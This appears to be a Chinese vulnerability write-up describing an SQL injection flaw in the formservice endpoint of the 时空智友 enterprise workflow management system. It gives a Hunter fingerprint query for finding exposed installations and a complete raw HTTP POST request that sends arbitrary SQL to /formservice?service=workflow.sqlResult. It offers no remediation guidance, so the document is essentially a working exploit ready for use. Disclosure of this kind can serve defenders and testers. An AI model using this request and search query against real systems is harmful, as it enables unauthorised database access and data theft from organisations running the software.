# 时空智友企业流程化管控系统formserverSQL注入漏洞

# 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统存在SQL注入漏洞，攻击者通过恶意构造的SQL查询来执行未经授权的数据库操作。当应用程序未能正确验证、转义或过滤用户提供的输入数据时，攻击者可以利用这个漏洞来执行恶意的SQL语句，从而绕过应用程序的访问控制和执行非法操作。

# 二、影响版本
+ 时空智友企业流程化管控系统

# 三、资产测绘
+ hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
+ 登录页面

![1693803612908-2a0fea76-532f-4ba1-87fa-4fc6bfae5cf3.png](./img/BCjbZh9dZ-Y2DPX1/1693803612908-2a0fea76-532f-4ba1-87fa-4fc6bfae5cf3-910348.png)

# 四、漏洞复现
```plain
POST /formservice?service=workflow.sqlResult HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=123D902C244908C8DA7E61657166AA09; __qypid=""
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 50

{"params": {"a": "11"}, "sql": "select db_name()"}
```

![1693804111348-8e2c5b0f-d232-4a2a-8247-6c750648a466.png](./img/BCjbZh9dZ-Y2DPX1/1693804111348-8e2c5b0f-d232-4a2a-8247-6c750648a466-301099.png)



> 更新: 2024-02-29 23:55:50  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fg34lg8tq11uy1kp>